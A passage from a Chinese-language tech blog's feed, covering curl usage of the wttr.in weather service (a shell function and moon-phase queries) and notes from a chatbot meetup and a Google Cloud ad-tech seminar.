&lt;li&gt;&lt;code&gt;/taipei_0&amp;amp;q&amp;amp;lang=zh.png&lt;/code&gt; 等同於 &lt;code&gt;/taipei_0q&amp;amp;lang=zh.png&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;可以包成一個簡單的 shell function&lt;/h3&gt;
&lt;p&gt;官方有&lt;a href="https://github.com/chubin/wttr.in/blob/ac939032fd593b14584ce5c38a86a68026a0190a/share/bash-function.txt"&gt;推薦怎麼加一個簡單使用 wttr.in 的 bash function&lt;/a&gt;&lt;br /&gt;
也可以用 &lt;code&gt;curl "wttr.in/:bash.function"&lt;/code&gt; 來察看  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;wttr()  
{  
    # change Paris to your default location  
    curl -H "Accept-Language: ${LANG%_*}" wttr.in/"${1:-Paris}"  
}&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很適合放在 shell 的 alias 裏面  &lt;/p&gt;
&lt;p&gt;我自己是改成自訂性再高一點，&lt;br /&gt;
可以自己決定要帶什麼參數。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Weather in terminal  &lt;/span&gt;
&lt;span class="s s-Atom"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;weather&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="s s-Atom"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Accept-Language: ${LANG%_*}&amp;quot;&lt;/span&gt; &lt;span class="s s-Atom"&gt;wttr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="s s-Atom"&gt;in/&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;${1:-Taipei}?${2:-0q}&amp;quot;&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;可以拿來看月亮圓缺&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Special locations:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;moon&lt;/span&gt;                   &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Moon&lt;/span&gt; &lt;span class="n"&gt;phase&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;US&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;France&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;these&lt;/span&gt; &lt;span class="n"&gt;cities&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;moon&lt;/span&gt;&lt;span class="mi"&gt;@2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Moon&lt;/span&gt; &lt;span class="n"&gt;phase&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;@2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;最後這個是跟天氣比較不太相關的功能  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/moon&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;可以接受日期作為參數，&lt;br /&gt;
觀看不同時間的月相。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/moon@2017-10-20&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;關於這功能的實作在這 &lt;a href="https://github.com/chubin/pyphoon"&gt;https://github.com/chubin/pyphoon&lt;/a&gt;，&lt;br /&gt;
是用 Python 撰寫的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;p&gt;程式的輸出其實來自另外一支用 Golang 寫的 CLI 程式，&lt;br /&gt;
&lt;a href="https://github.com/schachmat/wego"&gt;https://github.com/schachmat/wego&lt;/a&gt;&lt;br /&gt;
wttr.in 主要只是把 &lt;code&gt;wego&lt;/code&gt; 和 &lt;code&gt;pyphoon&lt;/code&gt; 的輸出以 web server 的方式呈現。  &lt;/p&gt;
&lt;p&gt;然後它其實有點不太穩，&lt;br /&gt;
例如在寫這篇文章的時候，&lt;br /&gt;
大概寫了兩個半小時左右，&lt;br /&gt;
不知道為啥寫到最後 wttr.in 就掛了。&lt;code&gt;Q_Q&lt;/code&gt;&lt;br /&gt;
有興趣的人其實可以 fork 下來自己架（？&lt;br /&gt;
專案原始碼在這 &lt;a href="https://github.com/chubin/wttr.in"&gt;https://github.com/chubin/wttr.in&lt;/a&gt;。&lt;br /&gt;
用 Python 寫的，&lt;br /&gt;
Web server 用 Flask + gevent，&lt;br /&gt;
天氣的部份則是接 &lt;a href="https://developer.worldweatheronline.com/api/"&gt;WorldWeatherOnline API&lt;/a&gt; 來用。  &lt;/p&gt;</summary><category term="CLI"></category><category term="Weather"></category></entry><entry><title>Facebook Developer Circle: Taipei - Meetup #4</title><link href="https://blog.m157q.tw/posts/2017/09/27/facebook-developer-circle-taipei-meetup-4/" rel="alternate"></link><published>2017-09-27T21:50:52+08:00</published><updated>2017-09-27T21:50:52+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-27:posts/2017/09/27/facebook-developer-circle-taipei-meetup-4/</id><summary type="html">&lt;p&gt;Event link: &lt;a href="https://fdctaipei.kktix.cc/events/fdc201709"&gt;https://fdctaipei.kktix.cc/events/fdc201709&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;用 OLAMI 打造各種形式的中文聊天機器人&lt;/h2&gt;
&lt;p&gt;講者：Ryan Hang (威盛電子 OLAMI Team)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OLAMI 中文自然語言處理平台 （威盛電子開發）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://olami.ai"&gt;https://olami.ai&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歷程  &lt;ul&gt;
&lt;li&gt;5 年前開始做，從 rule-based 開始，還沒用 Machine Learning。  &lt;/li&gt;
&lt;li&gt;到現在都還是很推薦用 rule-based，為什麼？  &lt;ul&gt;
&lt;li&gt;Machine Learning 的開發速度較緩慢，更新的速度可能更不上產品的需求，rule-based 就比較容易做到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OLAMI AI 對話系統資訊流概觀  &lt;ul&gt;
&lt;li&gt;輸入 =&amp;gt; NLI 自然語言互動系統 (+ 客製化語意理解) =&amp;gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 語音互動  &lt;ul&gt;
&lt;li&gt;OLAMI Voice Kit  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live Demo  &lt;ul&gt;
&lt;li&gt;速度還滿快的，感覺可以試試看，API 接一接應該不難。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;商務 Chatbot 體驗設計要訣&lt;/h2&gt;
&lt;p&gt;講者：Calvin Lin (Yoctol)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Business Chatbot 簡介  &lt;ul&gt;
&lt;li&gt;目的為實際商業應用，非純娛樂性質  &lt;/li&gt;
&lt;li&gt;主要功能包含  &lt;ul&gt;
&lt;li&gt;智慧客服：自動回覆常見問題，減少客服人員負擔。  &lt;/li&gt;
&lt;li&gt;訊息推播：文章訂閱、優惠訊息、活動通知  &lt;/li&gt;
&lt;li&gt;資訊查詢：查詢最新優惠、查股價、物流到貨查詢  &lt;/li&gt;
&lt;li&gt;商業互動：下單付款、預約登記、風險屬性評測  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chatbot 體驗的關鍵問題  &lt;ul&gt;
&lt;li&gt;預設用途  &lt;ul&gt;
&lt;li&gt;可以輸入任意文字並得到適當的回應  &lt;/li&gt;
&lt;li&gt;期待過高 =&amp;gt; 體驗不如預期 =&amp;gt; 失望  &lt;/li&gt;
&lt;li&gt;Business Chatbot 的限制  &lt;ul&gt;
&lt;li&gt;不能呼攏使用者  &lt;/li&gt;
&lt;li&gt;回覆內容要可控制  &lt;ul&gt;
&lt;li&gt;完全生成式的流程在商業應用上是有疑慮的，因為不知道會回出什麼樣的內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;指意  &lt;ul&gt;
&lt;li&gt;文字輸入框太過於自由，會讓使用者不知道要輸入什麼。得不到使用者期望的回答就會造成使用者的失望進而不想繼續使用。  &lt;/li&gt;
&lt;li&gt;為 Chatbot 添加指意  &lt;ul&gt;
&lt;li&gt;選單式引導(Generic Template, Button Template, Image map (LINE))  &lt;/li&gt;
&lt;li&gt;適時的文字提示（例句提示、Quick Reply）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 對體驗的影響  &lt;ul&gt;
&lt;li&gt;影響能力範圍  &lt;ul&gt;
&lt;li&gt;極致的 NLP：  &lt;ul&gt;
&lt;li&gt;可以輸入任意文字並得到適當的回覆 =&amp;gt; 滿足預設用途  &lt;/li&gt;
&lt;li&gt;使用者體驗會超極好，但實務上基本上做不太到，開發成本過高。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完全沒有 NLP  &lt;ul&gt;
&lt;li&gt;封鎖輸入框 =&amp;gt; 能力大幅受限  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 的實作方式  &lt;ul&gt;
&lt;li&gt;完全字串比對、關鍵字  &lt;/li&gt;
&lt;li&gt;正規表達式  &lt;/li&gt;
&lt;li&gt;RNN （遞迴式類神經網路）  &lt;ul&gt;
&lt;li&gt;輸入一些同樣意思的例句，讓 AI 去歸納和推論這些都是相同的意思。  &lt;/li&gt;
&lt;li&gt;實作比較複雜，訓練難度也比較高，會花比較多時間。  &lt;/li&gt;
&lt;li&gt;需要一點時間計算，所以在實務上回應使用者的時間會有點太長。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;視情況而定  &lt;ul&gt;
&lt;li&gt;比較明確的狀況使用字串比對或正規表達式，速度會比較快，使用者體驗會比較好。  &lt;/li&gt;
&lt;li&gt;比較複雜的狀況就採用 RNN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;體驗設計要訣  &lt;ol&gt;
&lt;li&gt;不同的使用者族群  &lt;ul&gt;
&lt;li&gt;既有客戶  &lt;ul&gt;
&lt;li&gt;有明確的問題想問 =&amp;gt; 確保重要的問題能被回應  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;新客戶、潛在客戶  &lt;ul&gt;
&lt;li&gt;認真想瞭解，但沒有明確的問題 =&amp;gt; 引導客戶探索主要功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;湊熱鬧的路人  &lt;ul&gt;
&lt;li&gt;只是剛好路過看到一個 bot，隨便玩一玩覺得你什麼都答不出來，然後說一句「好笨」就走了。XD  &lt;/li&gt;
&lt;li&gt;隨便玩 =&amp;gt; 明確提示使用範圍，縮小期望落差。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開場引導  &lt;ul&gt;
&lt;li&gt;用了 Generic Template 或 Button Template 的時候，可以再加些文字引導使用者，讓使用者覺得不是只有可以點按鈕而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;迷途引導  &lt;ul&gt;
&lt;li&gt;用提醒引導使用者回去使用正常的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;請求更多資訊  &lt;ul&gt;
&lt;li&gt;向使用者確認其目的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要停止引導  &lt;ul&gt;
&lt;li&gt;只要出現斷點，使用者就容易：  &lt;ul&gt;
&lt;li&gt;不知所措得離開  &lt;/li&gt;
&lt;li&gt;亂問不在範圍內的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;引導方式  &lt;ul&gt;
&lt;li&gt;接續目前的互動  &lt;/li&gt;
&lt;li&gt;推薦相關的選項  &lt;/li&gt;
&lt;li&gt;探索其他功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;使用情境 Demo  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;如何用 Messenger Bot 提升 EC/O2O 成交轉換率&lt;/h2&gt;
&lt;p&gt;講者：Lucas (AsiaYo Product Lead)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;緣由  &lt;ul&gt;
&lt;li&gt;一年前團隊就在討論要不要用 Chatbot 取代真人客服  &lt;/li&gt;
&lt;li&gt;結論是被否決的，因為能解決的問題像是使用者的行李和 check-in 的問題很難用 chatbot 解決，並不會減少真人客服的負擔  &lt;/li&gt;
&lt;li&gt;LINE 的 chatbot =&amp;gt; 3 steps before interaction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;那為什麼後來做了 Facebook Messenger Bot  &lt;ul&gt;
&lt;li&gt;Facebook Messenger bot =&amp;gt; 1 steps before interaction  &lt;/li&gt;
&lt;li&gt;直接接觸到使用者的成本低了很多  &lt;ul&gt;
&lt;li&gt;OTA's users have longer decision funnel  &lt;ul&gt;
&lt;li&gt;會和朋友討論、可能還會在期間去其他民宿網比價、轉換流失率很高  &lt;/li&gt;
&lt;li&gt;對應機制  &lt;ul&gt;
&lt;li&gt;Agoda: 不斷寄 email =&amp;gt; 需要拿到使用者的個人資料（email 或電話）  &lt;/li&gt;
&lt;li&gt;透過 retargeting ad 讓使用者不管到哪裡都會看到 =&amp;gt; 花費高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;需要的 Designer 少很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Key Metrics  &lt;ul&gt;
&lt;li&gt;同意授權 &amp;gt; 第一次互動 &amp;gt; 轉換  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System Architecture  &lt;ul&gt;
&lt;li&gt;Facebook checkbot plugin =&amp;gt; Chatfuel (JSON API) =&amp;gt; AsiaYo API =&amp;gt; Chatfuel (JSON API) =&amp;gt; Chatfuel Blocks (1st message)  &lt;ul&gt;
&lt;li&gt;hmm... 沒想到 Chatfuel JSON API 可以拿來這樣做，這樣應該連自己的 webhook server 都不用架了？跟 Facebook server 溝通那邊就由 Chatfuel 幫忙處理掉，跟 Facebook 那邊溝通的確會是花最多時間的地方，畢竟 Facebook 沒有官方的 Messenger Bot Framework，第三方的也不盡理想。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第一次互動  &lt;ul&gt;
&lt;li&gt;要具有趣味性與互動性  &lt;ul&gt;
&lt;li&gt;對話設計成像遊戲  &lt;/li&gt;
&lt;li&gt;隨機彩蛋 + 優惠碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實用性 &amp;amp; Cross Promotion  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Takeaways  &lt;ul&gt;
&lt;li&gt;Context matters  &lt;/li&gt;
&lt;li&gt;Createing Aha moments  &lt;ul&gt;
&lt;li&gt;讓使用者有眼睛一亮的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Future Works  &lt;ul&gt;
&lt;li&gt;Cart abandoned  &lt;/li&gt;
&lt;li&gt;Check order status  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Facebook"></category></entry><entry><title>CloudMile Google Cloud Ad Tech Seminar</title><link href="https://blog.m157q.tw/posts/2017/09/22/cloudmile-google-cloud-ad-tech-seminar/" rel="alternate"></link><published>2017-09-22T15:27:22+08:00</published><updated>2017-09-22T15:27:22+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-22:posts/2017/09/22/cloudmile-google-cloud-ad-tech-seminar/</id><summary type="html">&lt;h2&gt;GCP 簡介及 AD Tech 應用趨勢&lt;/h2&gt;
&lt;p&gt;Speaker: Harry Lin, Google Cloud Customer Engineer Lead  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Data lives in silos  &lt;ul&gt;
&lt;li&gt;資料是各自獨立的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For marketers - especially difficult to get a single view  &lt;ul&gt;
&lt;li&gt;Web Analytics, SEM, Ad Server, DSP, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Understading your customer?  &lt;ul&gt;
&lt;li&gt;資料完全分散，無法連結的話就無法得到有價值的資訊，也就無法瞭解使用者。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Google Cloud help you?  &lt;ul&gt;
&lt;li&gt;Google Analytics  &lt;ul&gt;
&lt;li&gt;Features  &lt;ul&gt;
&lt;li&gt;Acquisition &amp;amp; Behaviour Report  &lt;/li&gt;
&lt;li&gt;Enhanced e-commerce  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scenarios  &lt;ul&gt;
&lt;li&gt;有多種不同的資料來源  &lt;ul&gt;
&lt;li&gt;有 GA 的資料  &lt;/li&gt;
&lt;li&gt;有自己收集的資料  &lt;/li&gt;
&lt;li&gt;有跟其他合作伙伴拿到的資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Insight 1-2-3  &lt;ol&gt;
&lt;li&gt;Collect the data  &lt;ul&gt;
&lt;li&gt;BigQuery Data Transfer Service: Adwords, Double Click, Youtube  &lt;/li&gt;
&lt;li&gt;Direct Connectivity: Google Analytics 360 Suite, Firebase  &lt;/li&gt;
&lt;li&gt;Connectivity via Partners: informatica, Segment, talend, ...  &lt;/li&gt;
&lt;li&gt;三種途徑將所有的資料都匯入 BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cleanse the data  &lt;ul&gt;
&lt;li&gt;BigQuery (Raw Data) =&amp;gt; Cloud Dataprep (Data Analysts), Cloud Dataflow (Data Engineers) =&amp;gt; BigQuery (Clean Data)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analyze &amp;amp; Visualize  &lt;ul&gt;
&lt;li&gt;Analyze: BigQuery, Microsoft Excel, Google Sheets, JDBC/ODBS connectors  &lt;/li&gt;
&lt;li&gt;Visualize: Google Data Studio, tableau, looker, BI/Analytics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attribution Modeling: Which of my Channels Drive the Most Success?  &lt;ul&gt;
&lt;li&gt;Multi-channel  &lt;ul&gt;
&lt;li&gt;透過結合不同的 Custom ID，將資料一起灌到 BigQuery 分析，把使用者的行為連接起來。  &lt;ul&gt;
&lt;li&gt;Youtube, DoubleClick, Adwords, CRM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cookie based or Session based mapping 得透過 CRM 的 Custom ID 連接  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data lifecycle on Google  &lt;ul&gt;
&lt;li&gt;Capture  &lt;/li&gt;
&lt;li&gt;Process  &lt;/li&gt;
&lt;li&gt;Store  &lt;/li&gt;
&lt;li&gt;Analyze  &lt;/li&gt;
&lt;li&gt;Use  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Segment high value customers by behaviour  &lt;ul&gt;
&lt;li&gt;Fantasy Bingers  &lt;/li&gt;
&lt;li&gt;Action Weekly Tune-ins  &lt;/li&gt;
&lt;li&gt;Nightly Updates  &lt;/li&gt;
&lt;li&gt;Touch-and-Go Nature Clippers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ingest Data into BigQuery  &lt;ul&gt;
&lt;li&gt;有乾淨整理好的資料才能訓練出有用的模型，否則只是 garbage in, garbage out.  &lt;/li&gt;
&lt;li&gt;Indigest Data  &lt;/li&gt;
&lt;li&gt;Transform Data with Dataflow pipeline  &lt;/li&gt;
&lt;li&gt;Customer-Segmentation using ML/Clustering  &lt;ul&gt;
&lt;li&gt;Google Cloud Datalab  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Snapchat  &lt;ul&gt;
&lt;li&gt;QPS second only to Gmail  &lt;/li&gt;
&lt;li&gt;Bandwidth second only to Youtube  &lt;/li&gt;
&lt;li&gt;Monetization - Ads and Geofilters  &lt;ul&gt;
&lt;li&gt;In-App Image Search  &lt;/li&gt;
&lt;li&gt;3V - Vertical Video Views  &lt;/li&gt;
&lt;li&gt;Custom Geofilters  &lt;/li&gt;
&lt;li&gt;Early Adopters  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;AD Tech 在 GCP 上的應用技術簡介及國外案例&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Impact of Maching Learning  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.hbrtaiwan.com/article_content_AR0007025.html"&gt;資料分析運用四大階段&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;描述型分析：發生了什麼  &lt;/li&gt;
&lt;li&gt;診斷型分析：為什麼發生  &lt;/li&gt;
&lt;li&gt;預測型分析：未來會不會發生  &lt;/li&gt;
&lt;li&gt;指示型分析：如何讓它發生  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;汽車業  &lt;ul&gt;
&lt;li&gt;物件偵測  &lt;/li&gt;
&lt;li&gt;自動駕駛  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;醫療業  &lt;ul&gt;
&lt;li&gt;醫療影像辨識  &lt;/li&gt;
&lt;li&gt;個人化投藥  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;金融業  &lt;ul&gt;
&lt;li&gt;金融趨勢分析  &lt;/li&gt;
&lt;li&gt;異常偵測  &lt;ul&gt;
&lt;li&gt;盜刷  &lt;/li&gt;
&lt;li&gt;是否被詐騙  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電商  &lt;ul&gt;
&lt;li&gt;分析使用者行為  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Impact of Ad Tech  &lt;ul&gt;
&lt;li&gt;精準投放  &lt;/li&gt;
&lt;li&gt;Programmatic Buying  &lt;/li&gt;
&lt;li&gt;Media Planning Flow  &lt;ul&gt;
&lt;li&gt;What?  &lt;/li&gt;
&lt;li&gt;Who?  &lt;/li&gt;
&lt;li&gt;Where?  &lt;/li&gt;
&lt;li&gt;When?  &lt;/li&gt;
&lt;li&gt;How much?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recommendation Engine  &lt;ul&gt;
&lt;li&gt;相似廣告推薦  &lt;/li&gt;
&lt;li&gt;相似廣告受眾推薦  &lt;/li&gt;
&lt;li&gt;即時性推薦  &lt;ul&gt;
&lt;li&gt;根據使用者當下的時間點、地點、溫度、溼度做推薦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Personalization  &lt;ul&gt;
&lt;li&gt;抓出受眾的各個特徵  &lt;ul&gt;
&lt;li&gt;比較不容易得到的是偏向心理層面的特徵，可能得透過平常的行為去進行分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;86% 的消費者證實個人化行銷會影響他們的購買決策  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Audience Classification  &lt;ul&gt;
&lt;li&gt;Predict Click  &lt;ul&gt;
&lt;li&gt;將有點擊廣告和沒點擊廣告的歷史資訊拿來訓練出模型，之後就可以拿來預測是否會點擊廣告。  &lt;/li&gt;
&lt;li&gt;更複雜一點的就可以再加入更多的條件去做分類  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clustering  &lt;ul&gt;
&lt;li&gt;Lookalike audience  &lt;ul&gt;
&lt;li&gt;可以達到不需要浪費過多的資源就達成有效的廣告頭放  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Bidding: Right time, Right user, Right bid  &lt;ul&gt;
&lt;li&gt;Google Adwords: 將行銷列表、時間、瀏覽器、作業系統等等作為競價條件  &lt;/li&gt;
&lt;li&gt;Real Time Budget Allocation  &lt;ul&gt;
&lt;li&gt;不同的時間點設定不同的競價條件，達到即時動態調整預算，節省開銷且提升精準度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cases  &lt;ul&gt;
&lt;li&gt;MainAd  &lt;ul&gt;
&lt;li&gt;捨棄描述型的分析，採用了預測型的分析  &lt;ul&gt;
&lt;li&gt;描述型分析：先競價、再驗收、後預測  &lt;/li&gt;
&lt;li&gt;預測型分析：先預測、再競價、後驗收  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jivox  &lt;ul&gt;
&lt;li&gt;Creative Optimizer  &lt;/li&gt;
&lt;li&gt;Ad Content Recommendation Engine  &lt;/li&gt;
&lt;li&gt;Dynamic Audience Scoring  &lt;/li&gt;
&lt;li&gt;作法  &lt;ul&gt;
&lt;li&gt;Know =&amp;gt; Personalize =&amp;gt; Engage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;總結  &lt;ul&gt;
&lt;li&gt;只要有最佳化、預測的需求，就有機會利用 ML 達到最好的成果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Google Cloud Platform 客戶實例分享&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禾多  &lt;ul&gt;
&lt;li&gt;推播  &lt;/li&gt;
&lt;li&gt;Firebase  &lt;/li&gt;
&lt;li&gt;一天約上百萬到上千萬則推播  &lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;sklearn, TensorFlow  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Koodata  &lt;ul&gt;
&lt;li&gt;從 AWS 轉換過來  &lt;/li&gt;
